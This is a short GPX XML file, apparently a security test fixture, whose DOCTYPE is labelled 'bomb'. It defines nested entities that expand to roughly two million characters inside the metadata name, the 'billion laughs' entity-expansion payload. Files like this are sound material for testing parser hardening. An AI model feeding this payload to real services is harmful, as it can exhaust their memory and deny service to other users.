<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE bomb [
  <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
]>
<gpx version="1.1" creator="evil" xmlns="http://www.topografix.com/GPX/1/1">
  <metadata><name>&d;</name></metadata>
</gpx>
